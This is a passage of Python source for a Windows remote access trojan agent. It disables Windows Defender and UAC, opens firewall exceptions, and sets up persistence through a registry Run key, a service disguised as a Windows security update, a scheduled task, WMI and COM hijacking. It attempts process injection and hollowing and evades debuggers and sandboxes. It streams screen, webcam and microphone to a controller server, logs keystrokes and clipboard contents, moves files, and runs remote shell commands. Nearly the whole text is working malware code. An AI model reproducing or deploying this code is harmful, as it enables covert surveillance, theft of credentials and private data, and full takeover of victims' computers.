        # Multiple methods to disable Windows Defender
        defender_disable_methods = [
            disable_defender_registry,
            disable_defender_powershell,
            disable_defender_group_policy,
            disable_defender_service,
        ]
        
        for method in defender_disable_methods:
            try:
                if method():
                    return True
            except:
                continue
        
        return False
        
    except Exception as e:
        print(f"Failed to disable Defender: {e}")
        return False

def disable_defender_registry():
    """Disable Windows Defender via registry modifications."""
    try:
        import winreg
        
        # Disable real-time monitoring
        defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        realtime_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        
        # Create keys and set values
        keys_values = [
            (defender_key, "DisableAntiSpyware", 1),
            (realtime_key, "DisableRealtimeMonitoring", 1),
            (realtime_key, "DisableBehaviorMonitoring", 1),
            (realtime_key, "DisableOnAccessProtection", 1),
            (realtime_key, "DisableScanOnRealtimeEnable", 1),
        ]
        
        for key_path, value_name, value_data in keys_values:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry Defender disable failed: {e}")
        return False

def disable_defender_powershell():
    """Disable Windows Defender via PowerShell commands."""
    try:
        powershell_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -SubmitSamplesConsent 2',
        ]
        
        for cmd in powershell_commands:
            try:
                subprocess.run([
                    'powershell.exe', '-Command', cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        # Add exclusions for common paths
        exclusion_paths = [
            os.path.dirname(os.path.abspath(__file__)),
            tempfile.gettempdir(),
            os.path.expanduser("~\Downloads"),
            os.path.expanduser("~\Documents"),
        ]
        
        for path in exclusion_paths:
            try:
                subprocess.run([
                    'powershell.exe', '-Command',
                    f'Add-MpPreference -ExclusionPath "{path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"PowerShell Defender disable failed: {e}")
        return False

def disable_defender_group_policy():
    """Disable Windows Defender via Group Policy modifications."""
    try:
        import winreg
        
        # Group Policy registry paths
        gp_paths = [
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection", "ForceDefenderPassiveMode", 1),
        ]
        
        for key_path, value_name, value_data in gp_paths:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Group Policy Defender disable failed: {e}")
        return False

def disable_defender_service():
    """Disable Windows Defender services."""
    try:
        services_to_disable = [
            'WinDefend',
            'WdNisSvc',
            'WdNisDrv',
            'WdFilter',
            'WdBoot',
            'Sense',
        ]
        
        for service in services_to_disable:
            try:
                # Stop service
                subprocess.run([
                    'sc.exe', 'stop', service
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
                
                # Disable service
                subprocess.run([
                    'sc.exe', 'config', service, 'start=', 'disabled'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Service Defender disable failed: {e}")
        return False

def advanced_process_hiding():
    """Advanced process hiding techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Process Hollowing (simplified)
        hollow_process()
        
        # Method 2: DLL Injection into trusted process
        inject_into_trusted_process()
        
        # Method 3: Process Doppelganging (simplified)
        process_doppelganging()
        
        return True
        
    except Exception as e:
        print(f"Advanced process hiding failed: {e}")
        return False

def hollow_process():
    """Simple process hollowing technique."""
    try:
        # Create suspended process
        target_process = "notepad.exe"
        
        si = win32process.STARTUPINFO()
        pi = win32process.CreateProcess(
            None,
            target_process,
            None,
            None,
            False,
            win32con.CREATE_SUSPENDED,
            None,
            None,
            si
        )
        
        # In a real implementation, we would:
        # 1. Unmap the original executable
        # 2. Allocate memory for our payload
        # 3. Write our payload to the process memory
        # 4. Update the entry point
        # 5. Resume the process
        
        # For this demo, just resume the process
        win32process.ResumeThread(pi[1])
        
        win32api.CloseHandle(pi[0])
        win32api.CloseHandle(pi[1])
        
        return True
        
    except Exception as e:
        print(f"Process hollowing failed: {e}")
        return False

def inject_into_trusted_process():
    """Inject into a trusted process."""
    try:
        # Find explorer.exe process
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                # Get process handle
                process_handle = win32api.OpenProcess(
                    win32con.PROCESS_ALL_ACCESS,
                    False,
                    proc.info['pid']
                )
                
                # Allocate memory in target process
                dll_path = os.path.abspath(__file__).encode('utf-8')
                memory_address = win32process.VirtualAllocEx(
                    process_handle,
                    0,
                    len(dll_path),
                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                    win32con.PAGE_READWRITE
                )
                
                # Write DLL path to target process
                win32process.WriteProcessMemory(
                    process_handle,
                    memory_address,
                    dll_path,
                    len(dll_path)
                )
                
                # Get LoadLibraryA address
                kernel32 = win32api.GetModuleHandle("kernel32.dll")
                loadlibrary_addr = win32api.GetProcAddress(kernel32, "LoadLibraryA")
                
                # Create remote thread
                thread_handle = win32process.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    loadlibrary_addr,
                    memory_address,
                    0
                )
                
                win32api.CloseHandle(thread_handle)
                win32api.CloseHandle(process_handle)
                
                return True
                
        return False
        
    except Exception as e:
        print(f"Process injection failed: {e}")
        return False

def process_doppelganging():
    """Simplified process doppelganging technique."""
    try:
        # This is a simplified version - real implementation would use NTFS transactions
        temp_file = os.path.join(tempfile.gettempdir(), "temp_process.exe")
        
        # Copy legitimate executable
        legitimate_exe = r"C:\Windows\System32\notepad.exe"
        
        if os.path.exists(legitimate_exe):
            import shutil
            shutil.copy2(legitimate_exe, temp_file)
            
            # In real implementation, we would:
            # 1. Create NTFS transaction
            # 2. Overwrite file content with our payload
            # 3. Create process from the transacted file
            # 4. Rollback transaction
            
            # For demo, just execute the copied file
            subprocess.Popen([temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Clean up
            time.sleep(1)
            try:
                os.remove(temp_file)
            except:
                pass
                
            return True
        
        return False
        
    except Exception as e:
        print(f"Process doppelganging failed: {e}")
        return False

def advanced_persistence():
    """Advanced persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        persistence_methods = [
            setup_registry_persistence,
            setup_service_persistence, 
            setup_scheduled_task_persistence,
            setup_wmi_persistence,
            setup_com_hijacking_persistence,
        ]
        
        for method in persistence_methods:
            try:
                method()
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Advanced persistence failed: {e}")
        return False

def setup_service_persistence():
    """Setup persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        service_name = "WindowsSecurityUpdate"
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', service_name,
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Update Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Start service
        subprocess.run([
            'sc.exe', 'start', service_name
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Service persistence failed: {e}")
        return False

def setup_scheduled_task_persistence():
    """Setup persistence via scheduled task."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        task_name = "WindowsSecurityUpdateTask"
        
        # Create scheduled task
        subprocess.run([
            'schtasks.exe', '/create',
            '/tn', task_name,
            '/tr', current_exe,
            '/sc', 'onlogon',
            '/rl', 'highest',
            '/f'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def setup_wmi_persistence():
    """Setup persistence via WMI event subscription."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # WMI persistence using PowerShell
        wmi_script = f'''
$filterName = 'WindowsSecurityFilter'
$consumerName = 'WindowsSecurityConsumer'

$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query}}

$Arg = @{{
    Name=$consumerName
    CommandLineTemplate="{current_exe}"
}}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg

$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}}
'''
        
        subprocess.run([
            'powershell.exe', '-Command', wmi_script
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"WMI persistence failed: {e}")
        return False

def setup_com_hijacking_persistence():
    """Setup persistence via COM hijacking."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack a commonly used COM object
        clsid = "{00000000-0000-0000-0000-000000000000}"  # Placeholder CLSID
        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        print(f"COM hijacking persistence failed: {e}")
        return False

def add_firewall_exception():
    """Add firewall exception for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
        
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name="Python Agent {uuid.uuid4()}"',
            'dir=in', 'action=allow',
            f'program="{current_exe}"'
        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        
        return True
        
    except Exception as e:
        print(f"Failed to add firewall exception: {e}")
        return False

def hide_process():
    """Attempt to hide the current process from task manager."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set process to run in background with low priority
        process = psutil.Process()
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        
        # Try to hide from process list (limited effectiveness)
        ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
        
        return True
        
    except Exception as e:
        print(f"Failed to hide process: {e}")
        return False

def disable_uac():
    """Disable UAC (User Account Control) by modifying registry settings."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        print("[OK] UAC has been disabled.")
        return True
    except PermissionError:
        print("[!] Access denied. Run this script as administrator.")
        return False
    except Exception as e:
        print(f"[!] Error disabling UAC: {e}")
        return False

def run_as_admin():
    """Relaunch the script with elevated privileges if not already admin."""
    if not WINDOWS_AVAILABLE:
        return False
    
    if not is_admin():
        print("[!] Relaunching as Administrator...")
        try:
            # Relaunch with elevated privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}"', None, 1
            )
            sys.exit()
        except Exception as e:
            print(f"[!] Failed to relaunch as admin: {e}")
            return False
    return True

def setup_persistence():
    """Setup persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Add to startup registry
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        print(f"Failed to setup persistence: {e}")
        return False

def anti_analysis():
    """Anti-analysis and evasion techniques."""
    try:
        # Check for common analysis tools
        analysis_processes = [
            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in analysis_processes:
                # If analysis tool detected, sleep and exit
                time.sleep(60)
                sys.exit(0)
        
        # Check for VM environment
        vm_indicators = [
            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
        ]
        
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if any(indicator in system.Model.upper() for indicator in vm_indicators):
                    time.sleep(60)
                    sys.exit(0)
        except:
            pass
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            time.sleep(60)
            sys.exit(0)
        
        # Anti-sandbox: Check for mouse movement
        try:
            import win32gui
            pos1 = win32gui.GetCursorPos()
            time.sleep(2)
            pos2 = win32gui.GetCursorPos()
            if pos1 == pos2:
                # No mouse movement, might be sandbox
                time.sleep(60)
                sys.exit(0)
        except:
            pass
        
        return True
        
    except Exception as e:
        return False

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid static analysis."""
    # Simple XOR obfuscation for sensitive strings
    key = 0x42
    
    # Obfuscated strings (example)
    obfuscated = {
        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
    }
    
    return obfuscated

def sleep_random():
    """Random sleep to avoid pattern detection."""
    sleep_time = random.uniform(0.5, 2.0)
    time.sleep(sleep_time)

def add_to_startup():
    """Add the agent to the Windows startup registry for persistence."""
    if not WINDOWS_AVAILABLE:
        return

    try:
        # Get the path to the pythonw.exe executable and the current script
        python_exe = sys.executable.replace("python.exe", "pythonw.exe")
        script_path = os.path.abspath(__file__)
        
        # The command to be stored in the registry
        run_command = f'"{python_exe}" "{script_path}"'
        key_name = "GeminiAgent"

        # Open the Run key
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
            try:
                # Check if the key already exists and has the correct value
                current_value, _ = winreg.QueryValueEx(reg_key, key_name)
                if current_value == run_command:
                    print("Agent is already configured for startup.")
                    return
            except FileNotFoundError:
                # Key doesn't exist, so we'll create it
                pass

            # Set the registry key to run the agent on startup
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, run_command)
            print(f"Agent has been configured to run on startup.")

    except Exception as e:
        print(f"Error adding agent to startup: {e}")

def get_or_create_agent_id():
    """
    Gets a unique agent ID from config directory or creates it.
    """
    if WINDOWS_AVAILABLE:
        config_path = os.getenv('APPDATA')
    else:
        config_path = os.path.expanduser('~/.config')
        
    os.makedirs(config_path, exist_ok=True)
    id_file_path = os.path.join(config_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        with open(id_file_path, 'r') as f:
            return f.read().strip()
    else:
        agent_id = str(uuid.uuid4())
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file on Windows
        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
        return agent_id

def stream_screen(agent_id):
    """
    Captures the screen and streams it to the controller.
    This function runs in a separate thread.
    """
    global STREAMING_ENABLED
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    with mss.mss() as sct:
        while STREAMING_ENABLED:
            try:
                # Get raw pixels from the screen
                sct_img = sct.grab(sct.monitors[1])
                
                # Create an OpenCV image
                img = np.array(sct_img)
                
                # Encode the image as JPEG with 70% quality
                is_success, buffer = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if not is_success:
                    continue

                # Send the frame to the controller
                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
                
                # Control frame rate to ~10 FPS
                time.sleep(0.1)
            except Exception as e:
                print(f"Stream error: {e}")
                time.sleep(2) # Wait before retrying

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller.
    This function runs in a separate thread.
    """
    global CAMERA_STREAMING_ENABLED
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    try:
        # Use CAP_DSHOW on Windows for better device compatibility and performance.
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            print("Cannot open webcam")
            CAMERA_STREAMING_ENABLED = False
            return
    except Exception as e:
        print(f"Could not open webcam: {e}")
        CAMERA_STREAMING_ENABLED = False
        return

    while CAMERA_STREAMING_ENABLED:
        try:
            ret, frame = cap.read()
            if not ret:
                break
            is_success, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            if is_success:
                requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
            time.sleep(0.1) # ~10 FPS
        except Exception as e:
            print(f"Camera stream error: {e}")
            break
    cap.release()

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller.
    This function runs in a separate thread.
    """
    global AUDIO_STREAMING_ENABLED
    url = f"{SERVER_URL}/audio/{agent_id}"
    
    try:
        p = pyaudio.PyAudio()
        # --- Diagnostic: Print the default device to be used ---
        default_device_info = p.get_default_input_device_info()
        print(f"Attempting to use default audio device: {default_device_info['name']}")
        # --- End Diagnostic ---
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, input_device_index=default_device_info['index'])
    except Exception as e:
        print(f"Could not open audio stream: {e}")
        AUDIO_STREAMING_ENABLED = False
        return

    while AUDIO_STREAMING_ENABLED:
        try:
            data = stream.read(CHUNK)
            requests.post(url, data=data, timeout=1)
        except Exception as e:
            print(f"Audio stream error: {e}")
            break
    
    stream.stop_stream()
    stream.close()
    p.terminate()

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")

# --- Keylogger Functions ---

def on_key_press(key):
    """Callback for key press events."""
    global KEYLOG_BUFFER
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Regular character
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
        else:
            # Special key
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
    except Exception as e:
        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")

def keylogger_worker(agent_id):
    """Keylogger worker thread that sends data periodically."""
    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
    url = f"{SERVER_URL}/keylog_data/{agent_id}"
    
    while KEYLOGGER_ENABLED:
        try:
            if KEYLOG_BUFFER:
                # Send accumulated keylog data
                data_to_send = KEYLOG_BUFFER.copy()
                KEYLOG_BUFFER = []
                
                for entry in data_to_send:
                    requests.post(url, json={"data": entry}, timeout=5)
            
            time.sleep(5)  # Send data every 5 seconds
        except Exception as e:
            print(f"Keylogger error: {e}")
            time.sleep(5)

def start_keylogger(agent_id):
    """Start the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if not KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = True
        
        # Start keyboard listener
        listener = keyboard.Listener(on_press=on_key_press)
        listener.daemon = True
        listener.start()
        
        # Start worker thread
        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
        KEYLOGGER_THREAD.daemon = True
        KEYLOGGER_THREAD.start()
        
        print("Started keylogger.")

def stop_keylogger():
    """Stop the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = False
        if KEYLOGGER_THREAD:
            KEYLOGGER_THREAD.join(timeout=2)
        KEYLOGGER_THREAD = None
        print("Stopped keylogger.")

# --- Clipboard Monitor Functions ---

def get_clipboard_content():
    """Get current clipboard content."""
    if WINDOWS_AVAILABLE:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass
            return None
    else:
        # On Linux, we'll skip clipboard monitoring for now
        return None

def clipboard_monitor_worker(agent_id):
    """Clipboard monitor worker thread."""
    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
    
    while CLIPBOARD_MONITOR_ENABLED:
        try:
            current_content = get_clipboard_content()
            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                
                requests.post(url, json={"data": clipboard_entry}, timeout=5)
                LAST_CLIPBOARD_CONTENT = current_content
            
            time.sleep(2)  # Check clipboard every 2 seconds
        except Exception as e:
            print(f"Clipboard monitor error: {e}")
            time.sleep(2)

def start_clipboard_monitor(agent_id):
    """Start clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if not CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = True
        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
        CLIPBOARD_MONITOR_THREAD.daemon = True
        CLIPBOARD_MONITOR_THREAD.start()
        print("Started clipboard monitor.")

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = False
        if CLIPBOARD_MONITOR_THREAD:
            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
        CLIPBOARD_MONITOR_THREAD = None
        print("Stopped clipboard monitor.")

# --- File Management Functions ---

def handle_file_upload(command_parts):
    """Handle file upload from controller."""
    try:
        if len(command_parts) < 3:
            return "Invalid upload command format"
        
        destination_path = command_parts[1]
        file_content_b64 = command_parts[2]
        
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        
        return f"File uploaded successfully to {destination_path}"
    except Exception as e:
        return f"File upload failed: {e}"

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid download command format"
        
        file_path = command_parts[1]
        
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        
        # Read file and encode as base64
        with open(file_path, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode('utf-8')
        
        # Send file to controller
        filename = os.path.basename(file_path)
        url = f"{SERVER_URL}/file_upload/{agent_id}"
        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
        
        return f"File {file_path} sent to controller"
    except Exception as e:
        return f"File download failed: {e}"

# --- Voice Communication Functions ---

def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        # Handle 'cd' command for changing directory
        if command.strip().startswith("cd "):
            try:
                # Extract the directory from the command
                new_dir = command.strip().split(" ", 1)[1]
                
                # Change the current working directory
                os.chdir(new_dir)
                
                # Return the new current directory
                return f"Changed directory to: {os.getcwd()}"
            except IndexError:
                return "Invalid 'cd' command: No directory specified."
            except FileNotFoundError:
                return f"Directory not found: {new_dir}"
            except Exception as e:
                return f"Failed to change directory: {e}"

        if WINDOWS_AVAILABLE:
            # Explicitly use PowerShell to execute commands on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW,
                cwd=os.getcwd()  # Execute in the current directory
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30,
                cwd=os.getcwd()  # Execute in the current directory
            )
        
        # Combine stdout and stderr, ensuring proper formatting
        stdout = result.stdout.strip() if result.stdout else ""
        stderr = result.stderr.strip() if result.stderr else ""
        
        # Format output properly for terminal display
        output_lines = []
        if stdout:
            output_lines.append(stdout)
        if stderr:
            output_lines.append(f"Error: {stderr}")
        
        if not output_lines:
            return "[No output from command]"
        
        return "\n".join(output_lines)
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Command execution failed: {e}"

@sio.event
def connect():
    agent_id = get_or_create_agent_id()
    print(f"Connected to server. Registering with agent_id: {agent_id}")
    sio.emit('agent_connect', {'agent_id': agent_id})

@sio.event
def disconnect():
    print("Disconnected from server.")

@sio.on('command')
def on_command(data):
    agent_id = get_or_create_agent_id()
    command = data.get("command")
    output = ""

    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
        "start-keylogger": lambda: start_keylogger(agent_id),
        "stop-keylogger": stop_keylogger,
        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
